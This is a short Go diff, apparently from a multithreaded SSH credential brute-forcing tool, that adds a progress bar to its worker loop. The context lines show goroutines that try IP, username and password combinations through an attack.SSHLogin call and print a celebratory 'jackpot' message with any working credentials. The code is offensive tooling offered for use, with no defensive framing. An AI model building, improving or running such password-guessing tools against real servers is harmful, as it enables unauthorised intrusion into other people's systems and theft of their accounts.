@@ -8,6 +8,8 @@ import (
 	"os"
 	"runtime/pprof"
 	"sync"
+
+	"github.com/schollz/progressbar/v3"
 )
 
 type Task struct {
@@ -19,9 +21,13 @@ type Task struct {
 func runTask(tasks []Task, threads int, logger *log.Logger) {
 	var wg sync.WaitGroup
 	taskCh := make(chan Task, threads*2)
+	jobs := len(tasks)
+	fmt.Println("工作量:", jobs)
+	bar := progressbar.Default(int64(jobs))
 	for i := 0; i < threads; i++ {
 		go func() {
 			for task := range taskCh {
+				bar.Add(1)
 				success, _ := attack.SSHLogin(task.ip, task.user, task.password)
 				if success {
 					fmt.Println("中大獎了!!! IP=", task.ip, "帳號=", task.user, "密碼=", task.password)
